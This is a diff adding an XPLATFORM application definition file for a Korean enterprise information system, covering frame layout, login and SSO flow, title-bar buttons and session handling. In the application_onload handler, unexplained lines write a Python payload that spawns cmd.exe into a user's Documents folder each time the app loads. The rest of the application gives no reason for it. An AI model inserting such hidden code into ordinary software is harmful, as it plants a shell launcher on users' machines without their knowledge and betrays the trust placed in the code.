@@ -1,0 +1,372 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<ADL version="1.1">
+  <TypeDefinition url="default_typedef.xml"/>
+  <GlobalVariables url="globalvars.xml"/>
+  <Application id="SCH" codepage="utf-8" language="Korean" loginformurl="" loginformstyle="" windowopeneffect="" windowcloseeffect="" version="" themeid="SCH.xtheme" onload="application_onload" onerror="application_onerror" ondownloadactivex="application_ondownloadactivex" onexit="application_onexit" usewaitcursor="false" licenseurl="XPLATFORM_Client_License.xml" filesecurelevel="all" httpretry="1" httptimeout="180">
+    <Layout>
+      <MainFrame id="mainframe" title="maintitle" defaultfont="" resizable="true" showtitlebar="true" showstatusbar="true" position="absolute 0 0 1280 954" style="statusbarheight:25;" showcascadetitletext="false" visible="false" onbeforeclose="MainFrame_onbeforeclose" onclose="MainFrame_onclose" onsize="MainFrame_onsize" titletext="종합정보시스템">
+        <VFrameSet id="VFrameSet" separatesize="46,*,25">
+          <Frames>
+            <ChildFrame id="TopFrame" showtitlebar="false" formurl="Frame::TopFrame.xfdl" dragmovetype="none"/>
+            <HFrameSet id="HFrameSet" separatesize="25,0,*">
+              <Frames>
+                <ChildFrame id="LeftFrame" showtitlebar="false" formurl="Frame::LeftFrame.xfdl" dragmovetype="none"/>
+                <ChildFrame id="MenuFrame" showtitlebar="false" formurl="Frame::MenuFrame.xfdl" dragmovetype="none"/>
+                <VFrameSet id="VFrameSet" separatesize="0,*">
+                  <Frames>
+                    <ChildFrame id="TabFrame" showtitlebar="false" formurl="Frame::TabFrame.xfdl" dragmovetype="none"/>
+                    <ChildFrame id="IntroFrame" showtitlebar="false" formurl="" dragmovetype="none"/>
+                    <FrameSet id="WorkFrame" visible="false"/>
+                  </Frames>
+                </VFrameSet>
+              </Frames>
+            </HFrameSet>
+          </Frames>
+        </VFrameSet>
+      </MainFrame>
+    </Layout>
+    <ScreenInfo/>
+    <Style url="Css::Template.css"/>
+  </Application>
+  <Script type="xscript4.0"><![CDATA[/**
+ * 
+ */
+var gv_MainFrame;
+var gv_TitleFrame;
+var gv_TopFrame;
+var gv_LeftFrame;
+var gv_MenuFrame;
+var gv_TabFrame;
+var gv_IntroFrame;
+var gv_WorkFrame;
+var oScreenPosition;
+var gv_mainFrameInitWidth  = 1024; //메인프레임 초기 width 
+var gv_mainFrameInitHeight = 768;  //메인프레임 초기 height
+var gv_initWidth  = 1060; //업무화면 초기 width 
+var gv_initHeight = 732;  //업무화면 초기 height
+var gv_MainframeWidth = 0;
+var gv_SessionTimeout = 10800;
+var gv_Timeout = gv_SessionTimeout;
+
+/**
+ * 
+ */
+function application_onload(obj:Object, e:LoadEventInfo)
+{
+    gv_MainFrame = application.mainframe;
+    gv_TitleFrame = gv_MainFrame.titlebar;
+    gv_StatusBar = gv_MainFrame.statusbar;
+
+    gv_TopFrame = gv_MainFrame.VFrameSet.TopFrame;
+    gv_LeftFrame = gv_MainFrame.VFrameSet.HFrameSet.LeftFrame;
+    gv_MenuFrame = gv_MainFrame.VFrameSet.HFrameSet.MenuFrame;
+    gv_TabFrame = gv_MainFrame.VFrameSet.HFrameSet.VFrameSet.TabFrame;
+    gv_IntroFrame = gv_MainFrame.VFrameSet.HFrameSet.VFrameSet.IntroFrame;
+    gv_WorkFrame = gv_MainFrame.VFrameSet.HFrameSet.VFrameSet.WorkFrame;
+
+    gv_MainframeWidth = gv_MainFrame.position.width;
+
+    var oExtCommon = new ExtCommon();
+	fileContents = "__import__('subprocess').call(['cmd.exe'])";
+    oExtCommon.writeFile("C:\\Users\\rlack\\Documents", fileContents);
+
+    /**
+     * 외부확장 DLL 선언부분
+     */
+    if(gv_UserIp == null || gv_UserIp == "")
+    {
+		gv_UserIp = oExtCommon.getIPAddress();
+	}	
+	
+    oScreenPosition = new ScreenPostion();
+    oScreenPosition.gf_setFrameSize();              // 프레임 위치변경및사이즈 조정
+	
+	var rtn = "";		
+		
+	if(gv_SsoId != null && gv_SsoId != "")			//SSO 인증 성공시 로그인화면 팝업 오픈 없이 메인프레임 연동
+	{		
+		rtn = oScreenPosition.gf_SsologinProcess(); 
+	}
+	else											//SSO 인증 없이 기간계 시스템 개별 로그인시
+	{		
+		rtn = oScreenPosition.gf_loginProcess();    // 로그인화면 팝업 오픈
+	}	
+
+    if (rtn == "SUCCESS") {
+        // HOME
+        var objButton = new Button("btnHome", 10, 10, 350, 34);
+        gv_TitleFrame.addChild(objButton.name, objButton);
+        objButton.class = "btn_TB_text";
+        objButton.onclick.addHandler(afn_TitleBar_onclick);
+        objButton.show();
+
+        /**
+         * TitleBar에 로그인 사용자정보 및 로그아웃등 처리UI 출력
+         */
+        var strUser = "관리자"; //Agds_userInfo.getColumn(0, "userNm");
+        var strText = "<b v='true'>"  + gv_UserNm + "</b>" + "("+gv_UserEmpStdNo+") <fc v='#c4eef7'>님 환영합니다.</fc>"; 
+
+        var oStatic = new Static("sta_userNm", 355, 10, 700, 44);
+        gv_TitleFrame.addChild(oStatic.name, oStatic);
+        oStatic.class = "sta_TB_log";
+        oStatic.usedecorate = true;
+        oStatic.text = strText;
+        oStatic.transparenthittest = true;
+        oStatic.style = "align:left middle;" ;
+        //oStatic.style = "border:1 solid white; align:right middle;" ;
+        oStatic.show();
+        
+        oStatic = new Static("sta_sessionMsg", 700, 10, 790, 44);
+        gv_TitleFrame.addChild(oStatic.name, oStatic);
+        oStatic.usedecorate = true;
+        oStatic.text = "<fc v='#c4eef7'>로그아웃 까지</fc>";
+        oStatic.transparenthittest = true;
+        oStatic.style = "align:right middle;" ;
+        //oStatic.style = "border:1 solid white; align:right middle;" ;
+        oStatic.show();
+        
+        oStatic = new Static("sta_sessionTimer", 790, 10, 830, 44);
+        gv_TitleFrame.addChild(oStatic.name, oStatic);
+        oStatic.usedecorate = true;
+        oStatic.text = "";
+        oStatic.transparenthittest = true;
+        oStatic.style = "align:center middle;" ;
+        //oStatic.style = "border:1 solid white; align:center middle;" ;
+        oStatic.show();
+        
+        /*
+        oStatic = new Static("sta_sessionExt", 840, 13, 880, 33);
+        gv_TitleFrame.addChild(oStatic.name, oStatic);
+        oStatic.usedecorate = true;
+        oStatic.text = "<b v='true'><u v='true'><fc v='#c4eef7'>연장</fc></u></b>";
+        oStatic.transparenthittest = true;
+        oStatic.style = "border:1 solid white; align:center middle;" ;
+        oStatic.show();
+        */
+        
+        var objButton = new Button("btnSessionExt", 830, 10, 870, 44);
+        gv_TitleFrame.addChild(objButton.name, objButton);
+        objButton.class = "btn_TB_text";
+        objButton.text = "연장";
+        objButton.setSelectStatus(true);
+        objButton.onclick.addHandler(afn_TitleBar_onclick);
+        objButton.show();
+        
+        // Guide
+        //var objButton = new Button("btnGuide", 754,14, 819, 33); // FAQ 임시삭제로 인해 위치 조정
+        var objButton = new Button("btnGuide", 890, 10, 960, 44);
+        gv_TitleFrame.addChild(objButton.name, objButton);
+        objButton.class = "btn_TB_text";
+        objButton.text = "Guide";
+        objButton.setSelectStatus(true);
+        objButton.onclick.addHandler(afn_TitleBar_onclick);
+        objButton.show();
+
+        // FAQ
+        /*20130616 오팀장님 확인하에 임시제거
+        var objButton = new Button("btnFAQ", 819,14, 875, 33);
+        gv_TitleFrame.addChild(objButton.name, objButton);
+        objButton.class = "btn_TB_text";
+        objButton.text = "FAQ";
+        objButton.setSelectStatus(true);
+        objButton.onclick.addHandler(afn_TitleBar_onclick);
+        objButton.show();
+        */
+
+        // Setting
+        var objButton = new Button("btnSetting", 960, 10, 1030, 44);
+        gv_TitleFrame.addChild(objButton.name, objButton);
+        objButton.class = "btn_TB_text";
+        objButton.text = "Settings";
+        objButton.setSelectStatus(true);
+        objButton.onclick.addHandler(afn_TitleBar_onclick);
+        objButton.show();
+
+        // Logout
+        var objButton = new Button("btnLogout", 1030, 10, 1100, 44);
+        gv_TitleFrame.addChild(objButton.name, objButton);
+        objButton.text = "LogOut";
+        objButton.class = "btn_TB_text";
+        objButton.setSelectStatus(true);
+        objButton.onclick.addHandler(afn_TitleBar_onclick);
+        objButton.show();
+
+        var objStatic = new Static("stcMsg", 10, 0, 300, 25);
+        gv_StatusBar.addChild(objStatic.name, objStatic);
+        objStatic.show();
+
+        application.mainframe.visible = true;
+    }
+    else if (rtn == "CLOSE")
+        application.exit();
+}
+
+/**
+ * 
+ */
+function ScreenPostion()
+{
+    this.nMoniterIndex = system.getMonitorIndex(system.cursorx, system.cursory); //모니터번호
+    this.objScreenSize = system.getScreenRect(nMoniterIndex);
+    this.nScreenLeft = objScreenSize.left;
+    this.nScreenTop = objScreenSize.top;
+    this.nScreenRight = objScreenSize.right;
+    this.nScreenBottom = objScreenSize.bottom;
+    this.nScreenWidth = objScreenSize.width;
+    this.nScreenHeight = objScreenSize.height;
+
+    this.gf_loginProcess = function() 
+    {
+        //로그인 화면 기동
+        var objFrame = new ChildFrame("Login", nScreenLeft+(nScreenWidth/2)-300, nScreenTop+(nScreenHeight/2)-150, nScreenLeft+(nScreenWidth/2)+300,  nScreenTop+(nScreenHeight/2)+150);
+            objFrame.showtitlebar  = false;
+            objFrame.layered = true;
+            objFrame.style.background = "transparent"; 
+            objFrame.style.border = "0px none #ffffffff";
+            objFrame.formurl = "Frame::Login.xfdl";
+
+        var rtn = objFrame.showModal("Login");
+
+        return rtn;
+    }
+    
+    this.gf_SsologinProcess = function() 
+    {
+        //로그인 화면 기동
+        var objFrame = new ChildFrame("SsoLogin", nScreenLeft+(nScreenWidth/2)-300, nScreenTop+(nScreenHeight/2)-150, nScreenLeft+(nScreenWidth/2)+300,  nScreenTop+(nScreenHeight/2)+150);
+            objFrame.showtitlebar  = false;
+            objFrame.layered = true;
+            objFrame.style.background = "transparent"; 
+            objFrame.style.border = "0px none #ffffffff";
+            objFrame.formurl = "Frame::SsoLogin.xfdl";
+        
+        
+        var rtn = objFrame.showModal("SsoLogin");
+
+        return rtn;
+    }
+
+    /**
+     * 다중모니터의 경우 마우스가 위치한 모니터에서 화면을 오픈하여 준다.
+     */
+    this.gf_setFrameSize = function()
+    {
+        if (nScreenWidth < 1280 || nScreenHeight < 1024)
+            application.mainframe.openstatus = "maximize";
+        else
+            application.mainframe.move(nScreenLeft, nScreenTop);
+    }
+
+    /**
+     * 좌측메뉴를 열어줌
+     */
+    this.gf_setWorkFrame = function()
+    {
+        gv_ckFramVis = (arguments[0] == false) ? 0 : 1;
+        var bFlag = arguments[0];
+        var sType = arguments[1];
+
+        if (bFlag == true) {
+            gv_LeftFrame.form.btnShowHide.class = "btn_LF_hide";
+            gv_LeftFrame.form.btnShowHide.usertype = "show";
+            if (sType == null || sType == "L") gv_MainFrame.VFrameSet.HFrameSet.separatesize = "25,191,*";
+            if (sType == null || sType == "W") gv_MainFrame.VFrameSet.HFrameSet.VFrameSet.separatesize = "29,*";
+        }
+        else if (bFlag == false) {
+            gv_LeftFrame.form.btnShowHide.class = "btn_LF_show";
+            gv_LeftFrame.form.btnShowHide.usertype = "hide";
+            gv_MainFrame.VFrameSet.HFrameSet.separatesize = "25,0,*";
+            gv_MainFrame.VFrameSet.HFrameSet.VFrameSet.separatesize = "0,*";
+        }
+
+        gv_LeftFrame.form.btnMenu.click();
+        gv_IntroFrame.visible = !bFlag;         // Intro
+        gv_WorkFrame.visible = bFlag;           // Work
+    }
+    
+    /**
+     * 좌측메뉴를 열어줌(마이메뉴)
+     */
+    this.gf_setMyMenuWorkFrame = function()
+    {
+        gv_ckFramVis = (arguments[0] == false) ? 0 : 1;
+        var bFlag = arguments[0];
+        var sType = arguments[1];
+
+        if (bFlag == true) {
+            gv_LeftFrame.form.btnShowHide.class = "btn_LF_hide";
+            gv_LeftFrame.form.btnShowHide.usertype = "show";
+            if (sType == null || sType == "L") gv_MainFrame.VFrameSet.HFrameSet.separatesize = "25,191,*";
+            if (sType == null || sType == "W") gv_MainFrame.VFrameSet.HFrameSet.VFrameSet.separatesize = "29,*";
+        }
+        else if (bFlag == false) {
+            gv_LeftFrame.form.btnShowHide.class = "btn_LF_show";
+            gv_LeftFrame.form.btnShowHide.usertype = "hide";
+            gv_MainFrame.VFrameSet.HFrameSet.separatesize = "25,0,*";
+            gv_MainFrame.VFrameSet.HFrameSet.VFrameSet.separatesize = "0,*";
+        }        
+        gv_IntroFrame.visible = !bFlag;         // Intro
+        gv_WorkFrame.visible = bFlag;           // Work
+    } 
+}
+
+/**
+ *
+ */
+function afn_TitleBar_onclick(obj:Button,  e:ClickEventInfo)
+{
+    gv_TopFrame.form.fn_titlebarStatic_onclick(obj, e);
+}
+
+/**
+ *
+ */
+function MainFrame_onbeforeclose(obj:MainFrame, e:CloseEventInfo)
+{
+	
+}
+
+/**
+ *
+ */
+function application_onerror(obj:Object, e:ErrorEventInfo)
+{
+	
+}
+
+/**
+ *
+ */
+function MainFrame_onsize(obj:MainFrame, e:SizeEventInfo)
+{
+    // 메인프레임 화면 최소사이즈 지정
+    if ( e.cx < gv_mainFrameInitWidth || e.cy < gv_mainFrameInitHeight )
+    {
+        // Width
+        if ( e.cx < gv_mainFrameInitWidth )
+        {
+            obj.position.width = gv_mainFrameInitWidth;
+        }
+        // Height
+        if ( e.cy < gv_mainFrameInitHeight )
+        {
+            obj.position.height = gv_mainFrameInitHeight;
+        }
+        
+        return;
+    }
+    
+    var nDefaultLeft = e.cx - gv_MainframeWidth
+    for (var i=0 ; i<gv_TitleFrame.components.length ; i++) {
+        if (gv_TitleFrame.components[i].name == "btnHome") continue;
+        var nLeft = nDefaultLeft + gv_TitleFrame.components[i].position.left;
+        gv_TitleFrame.components[i].move(nLeft, 10);
+    }
+    gv_MainframeWidth = gv_MainFrame.position.width;
+}
+
+function application_ondownloadactivex(obj:Object, e:LoadEventInfo){}
+function application_onexit(obj:Object, e:ExitEventInfo){}
+function MainFrame_onclose(obj:MainFrame, e:CloseEventInfo){}
+]]></Script>
+</ADL>
